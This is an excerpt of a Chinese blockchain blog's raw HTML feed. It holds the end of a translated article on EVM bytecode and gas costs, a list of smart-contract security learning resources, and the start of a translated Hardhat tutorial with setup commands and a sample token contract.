string">"c3.sol"</span>:95:100  a <span class="token operator">=</span> <span class="token number">1</span> */  or  sub<span class="token punctuation">(</span>exp<span class="token punctuation">(</span>0x2, 0x80<span class="token punctuation">)</span>, 0x1<span class="token punctuation">)</span>    /* <span class="token string">"c3.sol"</span>:108:113  b <span class="token operator">=</span> <span class="token number">2</span> */  and  or  swap1  sstore<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>字节码是：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">600080547002000000000000000000000000000000006001608060020a03199091166001176001608060020a0316179055<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>将字节码格式化为每行一条指令：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// push 0x0<span class="token number">60</span> 00// dup1<span class="token number">80</span>// sload<span class="token number">54</span>// push17 push the the next <span class="token number">17</span> bytes as a <span class="token number">32</span> bytes number<span class="token number">70</span> 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00/* not<span class="token punctuation">(</span>sub<span class="token punctuation">(</span>exp<span class="token punctuation">(</span>0x2, 0x80<span class="token punctuation">)</span>, 0x1<span class="token punctuation">))</span> */// push 0x1<span class="token number">60</span> 01// push 0x80 <span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token number">60</span> <span class="token number">80</span>// push 0x80 <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token number">60</span> 02// exp0a// sub03// not<span class="token number">19</span>// swap1<span class="token number">90</span>// swap2<span class="token number">91</span>// and<span class="token number">16</span>// push 0x1<span class="token number">60</span> 01// or<span class="token number">17</span>/* sub<span class="token punctuation">(</span>exp<span class="token punctuation">(</span>0x2, 0x80<span class="token punctuation">)</span>, 0x1<span class="token punctuation">)</span> */// push 0x1<span class="token number">60</span> 01// push 0x80<span class="token number">60</span> <span class="token number">80</span>// push 0x02<span class="token number">60</span> 02// exp0a// sub03// and<span class="token number">16</span>// or<span class="token number">17</span>// swap1<span class="token number">90</span>// sstore<span class="token number">55</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>汇编代码中使用了四个魔法值(magic values)：</p><ul><li>0x1 (16 字节)，使用低 16 字节</li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 用字节码表示为 0x01<span class="token number">16</span>:32 0x0000000000000000000000000000000000:16 0x00000000000000000000000000000001<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><ul><li>0x2 (16 字节)，使用更高的 16 字节</li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 用字节码表示为 0x200000000000000000000000000000000<span class="token number">16</span>:32 0x0000000000000000000000000000000200:16 0x00000000000000000000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><ul><li><code>not(sub(exp(0x2, 0x80), 0x1))</code>​</li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 高 <span class="token number">16</span> 字节的位掩码<span class="token number">16</span>:32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00:16 0x00000000000000000000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><ul><li><code>sub(exp(0x2, 0x80), 0x1)</code>​</li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 低 <span class="token number">16</span> 字节的位掩码<span class="token number">16</span>:32 0x00000000000000000000000000000000 00:16 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>该代码对这些值进行了一些位操作以达到所需的结果：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">16</span>:32 0x00000000000000000000000000000002 00:16 0x00000000000000000000000000000001<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>最后，这个 32 字节的值存储在位置 <code>0x0</code>。</p><h2 id="Gas-Usage"><a href="#Gas-Usage" class="headerlink" title="Gas Usage"></a>Gas Usage</h2><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">600080547002000000000000000000000000000000006001608060020a03199091166001176001608060020a0316179055<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>注意，字节码中嵌入了 <code>0x200000000000000000000000000000000</code>。但编译器也可以选择使用指令 <code>exp(0x2, 0x81)</code>来计算值，这会产生更短的字节码序列。</p><p>但事实证明，<code>0x200000000000000000000000000000000</code> 比 <code>exp(0x2, 0x81)</code> 更便宜。让我们看一下所涉及的 gas 费用：</p><ul><li>为交易的每个零字节数据或代码支付 4 gas</li><li>交易的每个非零字节数据或代码需要 68 gas</li></ul><p>让我们比较一下两种表示在 gas 中的成本。</p><ul><li>字节码 <code>0x200000000000000000000000000000000</code> 有很多 0，很便宜：(1 * 68) + ( 16 * 4) &#x3D; 196</li><li>字节码 <code>608160020a</code> 更短但没有 0：5 * 68 &#x3D; 340</li></ul><p>具有更多零的较长序列实际上更便宜！</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>EVM 编译器并未针对字节码大小或速度或内存效率进行精确优化。相反，它优化了 gas 使用，这是一层间接(indirection)以激励以太坊区块链可以有效进行的计算。</p><p>我们已经看到了 EVM 的一些古怪方面：</p><ul><li>EVM 是一个 256 位的机器。以 32 字节为单位处理数据是最自然的做法。</li><li>持久性存储非常昂贵。</li><li>Solidity 编译器做出了有趣的选择，以尽量减少 gas 使用。</li></ul><p>Gas 成本的设定有些武断，未来很可能会发生变化。随着成本的变化，编译器会做出不同的选择。</p><h2 id="Other-Parts"><a href="#Other-Parts" class="headerlink" title="Other Parts"></a>Other Parts</h2><p>在这一系列文章中，我翻译了 <a href="https://medium.com/@hayeah">Howard</a> 的 <a href="https://blog.qtum.org/diving-into-the-ethereum-vm-6e8d5d2f3c30">Diving Into The Ethereum VM</a> 系列文章。译文链接如下：</p><ul><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part1-zh/">深入以太坊虚拟机 Part1 — 汇编与字节码</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part2-zh/">深入以太坊虚拟机 Part2 — 固定长度数据类型的表示</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part3-zh/">深入以太坊虚拟机 Part3 — 动态数据类型的表示</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part4-zh/">深入以太坊虚拟机 Part4 — 智能合约外部方法调用</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part5-zh/">深入以太坊虚拟机 Part5 — 智能合约创建过程</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part6-zh/">深入以太坊虚拟机 Part6 — Solidity 事件实现</a><br>也可以直接看总结篇：</li><li><a href="http://alphafitz.com/2022/10/17/diving-into-the-ethereum-vm-summary">深入以太坊虚拟机 总结</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;深入以太坊虚拟机-Part1-—-汇编与字节码&quot;&gt;&lt;a href=&quot;#深入以太坊虚拟机-Part1-—-汇编与字节码&quot; class=&quot;headerlink&quot; title=&quot;深入以太坊虚拟机 Part1 — 汇编与字节码&quot;&gt;&lt;/a&gt;深入以太坊虚拟机 Part1 — </summary>
      
    
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="以太坊虚拟机" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="智能合约开发" scheme="https://alphafitz.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>区块链安全学习资料</title>
    <link href="https://alphafitz.com/2022/10/01/learning-materials-blockchain-security/"/>
    <id>https://alphafitz.com/2022/10/01/learning-materials-blockchain-security/</id>
    <published>2022-10-01T09:11:59.000Z</published>
    <updated>2022-10-14T03:26:19.639Z</updated>
    
    <content type="html"><![CDATA[<h1 id="区块链安全学习资料"><a href="#区块链安全学习资料" class="headerlink" title="区块链安全学习资料"></a>区块链安全学习资料</h1><h2 id="个人资产保护"><a href="#个人资产保护" class="headerlink" title="个人资产保护"></a>个人资产保护</h2><ul><li><a href="https://github.com/slowmist/Blockchain-dark-forest-selfguard-handbook/blob/main/README_CN.md">区块链黑暗森林自救手册(中文版) @慢雾</a></li></ul><h2 id="智能合约开发"><a href="#智能合约开发" class="headerlink" title="智能合约开发"></a>智能合约开发</h2><ul><li><a href="https://consensys.github.io/smart-contract-best-practices/">Ethereum Smart Contract Security Best Practices</a><ul><li><a href="https://github.com/ConsenSys/smart-contract-best-practices/blob/master/README-zh.md">以太坊智能合约最佳实践</a></li></ul></li><li><a href="https://mirror.xyz/ninjak.eth/ygaDE0QQwn3lfI-AVaw0ZMqHQtWCdzo-XV450j2camc">Solidity极简入门-安全专题：Metamask项目方给Solidity程序员的16个安全建议</a></li><li><a href="https://blog.sigmaprime.io/solidity-security.html">Solidity Security: Comprehensive list of known attack vectors and common anti-patterns (2018.10.20)</a></li><li><a href="https://www.openzeppelin.com/">OpenZeppelin: The standard for secure blockchain applications</a></li><li><a href="https://mirror.xyz/ninjak.eth/8xwoMmIMevq2GuCxmsw0JKxOiSe8Lc0ksCJIY8wbHh0">Solcurity 安全标准</a><ul><li>翻译修改自 <a href="https://github.com/transmissions11">@transmission11</a> 的 <a href="https://github.com/transmissions11/solcurity">The Solcurity Standard</a></li></ul></li></ul><h2 id="EVM学习"><a href="#EVM学习" class="headerlink" title="EVM学习"></a>EVM学习</h2><ul><li>Diving Into The Ethereum Virtual Machine 系列<ul><li><a href="https://medium.com/@hayeah/diving-into-the-ethereum-vm-6e8d5d2f3c30">Diving Into The Ethereum Virtual Machine</a><ul><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part1-zh/">深入以太坊虚拟机 Part1 — 汇编与字节码</a></li></ul></li><li><a href="https://medium.com/@hayeah/diving-into-the-ethereum-vm-part-2-storage-layout-bc5349cb11b7">Diving Into The Ethereum VM Part 2 — How I Learned To Start Worrying And Count The Storage Cost</a><ul><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part2-zh/">深入以太坊虚拟机 Part2 — 固定长度数据类型的表示</a></li></ul></li><li><a href="https://medium.com/@hayeah/diving-into-the-ethereum-vm-the-hidden-costs-of-arrays-28e119f04a9b">Diving Into The Ethereum VM Part 3 — The Hidden Costs of Arrays</a><ul><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part3-zh/">深入以太坊虚拟机 Part3 — 动态数据类型的表示</a></li></ul></li><li><a href="https://medium.com/@hayeah/how-to-decipher-a-smart-contract-method-call-8ee980311603">Diving Into The Ethereum VM Part 4 — How To Decipher A Smart Contract Method Call</a><ul><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part4-zh/">深入以太坊虚拟机 Part4 — 智能合约外部方法调用</a></li></ul></li><li><a href="https://medium.com/@hayeah/diving-into-the-ethereum-vm-part-5-the-smart-contract-creation-process-cb7b6133b855">Diving Into The Ethereum VM Part 5 — The Smart Contract Creation Process</a><ul><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part5-zh/">深入以太坊虚拟机 Part5 — 智能合约创建过程</a></li></ul></li><li><a href="https://blog.qtum.org/how-solidity-events-are-implemented-diving-into-the-ethereum-vm-part-6-30e07b3037b9">Diving Into The Ethereum VM Part 6 — How Solidity Events Are Implemented</a><ul><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part6-zh/">深入以太坊虚拟机 Part6 — Solidity 事件实现</a></li></ul></li></ul></li><li>EVM Deep Dives 系列<ul><li><a href="https://noxx.substack.com/p/evm-deep-dives-the-path-to-shadowy">EVM Deep Dives: The Path to Shadowy Super Coder 💻 - Part 1</a></li><li><a href="https://noxx.substack.com/p/evm-deep-dives-the-path-to-shadowy-d6b">EVM Deep Dives: The Path to Shadowy Super Coder 💻 - Part 2</a></li><li><a href="https://noxx.substack.com/p/evm-deep-dives-the-path-to-shadowy-3ea">EVM Deep Dives: The Path to Shadowy Super Coder 💻 - Part 3</a></li><li><a href="https://noxx.substack.com/p/evm-deep-dives-the-path-to-shadowy-5a5">EVM Deep Dives: The Path to Shadowy Super Coder 💻 - Part 4</a></li><li><a href="https://noxx.substack.com/p/evm-deep-dives-the-path-to-shadowy-a5f">EVM Deep Dives: The Path to Shadowy Super Coder 💻 - Part 5</a></li><li><a href="https://noxx.substack.com/p/evm-deep-dives-the-path-to-shadowy-16e">EVM Deep Dives: The Path to Shadowy Super Coder 💻 - Part 6</a></li></ul></li></ul><h2 id="区块链CTF与安全训练"><a href="#区块链CTF与安全训练" class="headerlink" title="区块链CTF与安全训练"></a>区块链CTF与安全训练</h2><ul><li><a href="https://ethernaut.openzeppelin.com/">The Ethernaut</a><ul><li>基于 Web3&#x2F;Solidity 的对抗游戏，每个关卡是一个需要被”hacked”的智能合约</li></ul></li><li><a href="https://www.damnvulnerabledefi.xyz/">Damn Vulnerable DeFi</a><ul><li>The offensive security playground for decentralized finances</li></ul></li><li><a href="https://chainflag.org/">CAPTURE THE FALG</a><ul><li>Learn blockchain security through CTF challenges</li></ul></li><li><a href="https://ctf.paradigm.xyz/">Paradigm CTF</a></li><li><a href="https://github.com/SunWeb3Sec/DeFiVulnLabs">DeFiVulnLabs</a><ul><li><a href="https://xrex.io/">XREX</a> 的内部 Web3 Solidity 安全训练</li></ul></li></ul><h2 id="区块链安全事件分析"><a href="#区块链安全事件分析" class="headerlink" title="区块链安全事件分析"></a>区块链安全事件分析</h2><ul><li><a href="https://github.com/SunWeb3Sec/DeFiHackLabs">DeFi Hacks Reproduce - Foundry @DeFiHackLabs</a></li><li><a href="https://github.com/slowmist/Knowledge-Base">Knowledge Base 慢雾安全团队知识库</a></li><li><a href="https://github.com/blocksecteam/blocksec_academy">攻击分析与安全开发建议 @BlockSec Academy</a></li><li><a href="https://hacked.slowmist.io/zh/">(区块链)被黑档案库(中文) @慢雾</a></li></ul><h2 id="开发及安全工具"><a href="#开发及安全工具" class="headerlink" title="开发及安全工具"></a>开发及安全工具</h2><ul><li><a href="https://hardhat.org/">Hardhat - 基于 Node.js 的以太坊智能合约开发框架</a></li><li><a href="https://github.com/foundry-rs/foundry">Foundry - Rust 编写的以太坊应用开发工具包</a></li><li><a href="https://github.com/Jon-Becker/heimdall-rs/wiki">Heimdall - 先进的EVM工具包，旨在简化基于EVM的链上智能合约处理</a></li><li>交易调试工具<ul><li><a href="https://phalcon.blocksec.com/">Phalcon</a> | <a href="https://tx.eth.samczsun.com/">Tx.viewer</a> | <a href="https://ethtx.info/">Ethtx</a> | <a href="https://dashboard.tenderly.co/explorer">Tenderly</a></li></ul></li><li>以太坊签名数据库<ul><li><a href="https://www.4byte.directory/">4byte</a> | <a href="https://sig.eth.samczsun.com/">sig.eth</a> | <a href="https://www.etherface.io/hash">etherface</a></li></ul></li><li>ABI &amp; calldata 解析<ul><li><a href="https://gnidan.github.io/abi-to-sol/">ABI to interface</a> | <a href="https://abi.w1nt3r.xyz/">Get ABI for unverified contracts</a> | <a href="https://apoorvlathey.com/eth-calldata-decoder/">ETH Calldata Decoder</a> | <a href="https://oko.palkeo.com/">Oko Contract Explorer</a></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;区块链安全学习资料&quot;&gt;&lt;a href=&quot;#区块链安全学习资料&quot; class=&quot;headerlink&quot; title=&quot;区块链安全学习资料&quot;&gt;&lt;/a&gt;区块链安全学习资料&lt;/h1&gt;&lt;h2 id=&quot;个人资产保护&quot;&gt;&lt;a href=&quot;#个人资产保护&quot; class=&quot;head</summary>
      
    
    
    
    <category term="学习资料" scheme="https://alphafitz.com/categories/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/"/>
    
    
    <category term="区块链安全" scheme="https://alphafitz.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Hardhat Tutorial &amp; Guides</title>
    <link href="https://alphafitz.com/2022/09/21/tools-hardhat-tutorial-guides/"/>
    <id>https://alphafitz.com/2022/09/21/tools-hardhat-tutorial-guides/</id>
    <published>2022-09-21T02:18:15.000Z</published>
    <updated>2022-09-29T11:30:20.908Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hardhat-Tutorial-amp-Guides"><a href="#Hardhat-Tutorial-amp-Guides" class="headerlink" title="Hardhat Tutorial &amp; Guides"></a>Hardhat Tutorial &amp; Guides</h1><blockquote><p>本文是对 Hardhat 官网的入门教程 <a href="https://hardhat.org/tutorial">Hardhat’s tutorial for beginners</a> 及 指南 <a href="https://hardhat.org/hardhat-runner/docs/guides/project-setup">Guides</a> 的部分翻译。</p></blockquote><h2 id="1-设置环境"><a href="#1-设置环境" class="headerlink" title="1. 设置环境"></a>1. 设置环境</h2><p>大多数的 Ethereum 库和工具都是使用 JavaScript 编写的，Hardhat 也是如此。因此在设置环境的时候，需要安装 <a href="https://nodejs.org/">Node.js</a>。</p><p>本教程推荐使用 VSCode + Hardhat 插件。如果您使用的是 Windows，推荐您使用 wsl 安装 Node.js 以使用 Hardhat。</p><h2 id="2-创建新的-Hardhat-工程"><a href="#2-创建新的-Hardhat-工程" class="headerlink" title="2. 创建新的 Hardhat 工程"></a>2. 创建新的 Hardhat 工程</h2><p>在空文件夹中初始化 npm 工程：<code>npm init</code>，如果想直接跳过需要回答的问题，可以直接使用：<code>npm init -y</code>。该命令会在空文件夹中生成一个 <code>package.json</code> 文件。</p><p>安装 Hardhat 到本地，并将包(package)保存到 <code>devDependencies</code> 中(见<a href="https://docs.npmjs.com/cli/v8/commands/npm-install">npm install</a>)：<code>npm install --save-dev hardhat</code> (<code>devDependencies</code> 选项体现在 <code>package.json</code> 中)。</p><p>在安装了 Hardhat 的相同文件夹下可以运行 hardhat：<code>npx hardhat</code> (<a href="https://docs.npmjs.com/cli/v8/commands/npx">npx</a> 可以从本地或远程 npm 包运行一个命令而不需要知道包确切的路径)。</p><p>选择 <code>Create an empty hardhat.config.js</code>，将会在文件夹中创建一个 <code>hardhat.config.js</code> 配置文件，选择创建 JS&#x2F;TS 工程将会创建包含了合约文件、测试脚本和部署脚本的模板工程。(一个 <code>hardhat.config.js</code> 配置文件足以在默认工程结构中使用 Hardhat)</p><p>选择创建 JS&#x2F;TS 工程后的初始化工程结构为：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">contracts/         <span class="token comment"># 合约源文件</span>scripts/           <span class="token comment"># 自动化脚本文件</span>test/              <span class="token comment"># 测试文件</span>hardhat.config.js  <span class="token comment"># 配置文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>当 Hardhat 运行时，它会从当前工作目录开始搜索最近的 <code>hardhat.config.js</code> 配置文件，该文件通常位于项目的根目录中，空的 <code>hardhat.config.js</code> 足以让 Hardhat 工作。Hardhat 的全部设置都包含在此文件中。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">npm</span> init -y  <span class="token comment"># 初始化 npm 工程，生成 package.json 配置文件</span>$ <span class="token function">npm</span> <span class="token function">install</span> --save-dev hardhat  <span class="token comment"># 安装 Hardhat 到本地</span>$ npx hardhat  <span class="token comment"># 创建新的 hardhat.config.js 配置文件 或 创建 JS/TS 工程</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="Hardhat-结构"><a href="#Hardhat-结构" class="headerlink" title="Hardhat  结构"></a>Hardhat  结构</h3><p>Hardhat 是围绕任务(task)和插件(plugin)的概念设计的。Hardhat 的大部分功能来自插件，用户可以<a href="https://hardhat.org/hardhat-runner/plugins">自由选择</a>要使用的插件。</p><h4 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h4><p>每次从命令行运行 Hardhat，都是在运行一个任务。比如，<code>npx hardhat compile</code> 就是在运行 <code>compile</code> 任务。<code>npx hardhat</code> 或 <code>npx hardhat help</code> 可以查看当前可用的任务。<code>npx hardhat help [task_name]</code> 可以进一步了解某个可用的任务。</p><p>用户也可以创建自己的任务，查看<a href="https://hardhat.org/hardhat-runner/docs/advanced/create-task">创建任务</a>进一步了解。</p><h4 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h4><p>Hardhat 不限制最终使用的工具形态，但有一些内置的默认值。所有的默认值都可以修改。大多数情况下，使用给定工具的方法是将其集成到 Hardhat 的<a href="https://hardhat.org/hardhat-runner/plugins">插件</a>中。</p><p>本教程中将使用推荐的插件 <code>@nomicfoundation/hardhat-toolbox</code>，<a href="https://hardhat.org/hardhat-runner/plugins/nomicfoundation-hardhat-toolbox">Hardhat Toolbox</a> 绑定了开始使用 Hardhat 开发智能合约所需的一切。</p><p>在当前文件夹运行命令来安装：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> --save-dev @nomicfoundation/hardhat-toolbox<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>然后在 <code>hardhat.config.js</code> 文件开头添加新行：</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"@nomicfoundation/hardhat-toolbox"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>对于 Hardhat 的所有配置都在 <code>hardhat.config.js</code> 配置文件中更改，具体的可配置选项参考 <a href="https://hardhat.org/hardhat-runner/docs/config">Hardhat Configuration</a>。</p><h2 id="3-编写-amp-编译合约"><a href="#3-编写-amp-编译合约" class="headerlink" title="3. 编写 &amp; 编译合约"></a>3. 编写 &amp; 编译合约</h2><p>本节要实现的是编写一个简单的智能合约实现可以被转换的代币(本处的代币合约并没有符合 ERC20 标准)。</p><h3 id="编写合约"><a href="#编写合约" class="headerlink" title="编写合约"></a>编写合约</h3><p>创建新的名为 <code>contracts</code> 的目录，在该目录中创建名为 <code>Token.sol</code> 的文件。将下面的代码复制到合约文件中。</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">//SPDX-License-Identifier: UNLICENSED</span><span class="token comment">// Solidity files have to start with this pragma.</span><span class="token comment">// It will be used by the Solidity compiler to validate its version.</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.9</span><span class="token punctuation">;</span><span class="token comment">// This is the main building block for smart contracts.</span><span class="token keyword">contract</span> <span class="token class-name">Token</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Some string type variables to identify the token.</span>    <span class="token builtin">string</span> <span class="token keyword">public</span> name <span class="token operator">=</span> <span class="token string">"My Hardhat Token"</span><span class="token punctuation">;</span>    <span class="token builtin">string</span> <span class="token keyword">public</span> symbol <span class="token operator">=</span> <span class="token string">"MHT"</span><span class="token punctuation">;</span>    <span class="token comment">// The fixed amount of tokens, stored in an unsigned integer type variable.</span>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> totalSupply <span class="token operator">=</span> <span class="token number">1000000</span><span class="token punctuation">;</span>    <span class="token comment">// An address type variable is used to store ethereum accounts.</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>    <span class="token comment">// A mapping is a key/value map. Here we store each account's balance.</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> balances<span class="token punctuation">;</span>    <span class="token comment">// The Transfer event helps off-chain applications understand</span>    <span class="token comment">// what happens within your contract.</span>    <span class="token keyword">event</span> <span class="token function">Transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">indexed</span> _from<span class="token punctuation">,</span> <span class="token builtin">address</span> <span class="token keyword">indexed</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Contract initialization.     */</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// The totalSupply is assigned to the transaction sender, which is the</span>        <span class="token comment">// account that is deploying the contract.</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> totalSupply<span class="token punctuation">;</span>        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * A function to transfer tokens.     *     * The `external` modifier makes a function *only* callable from *outside*     * the contract.     */</span>    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Check if the transaction sender has enough tokens.</span>        <span class="token comment">// If `require`'s first argument evaluates to `false` then the</span>        <span class="token comment">// transaction will revert.</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> amount<span class="token punctuation">,</span> <span class="token string">"Not enough tokens"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Transfer the amount.</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> amount<span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>to<span class="token punctuation">]</span> <span class="token operator">+=</span> amount<span class="token punctuation">;</span>        <span class="token comment">// Notify off-chain applications of the transfer.</span>        <span class="token keyword">emit</span> <span class="token function">Transfer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Read only function to retrieve the token balance of a given account.     *     * The `view` modifier indicates that it doesn't modify the contract's     * state, which allows us to call it without executing a transaction.     */</span>    <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> account<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> balances<span class="token punctuation">[</span>account<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="编译合约"><a href="#编译合约" class="headerlink" title="编译合约"></a>编译合约</h3><p>如果您需要自定义 Solidity 编译器选项，则可以通过更改 <code>hardhat.config.js</code> 中的 <code>solidity</code> 字段来实现。使用此字段的最简单方法是设置编译器版本的简写，我们建议始终这样做：</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">solidity</span><span class="token operator">:</span> <span class="token string">"0.8.9"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" 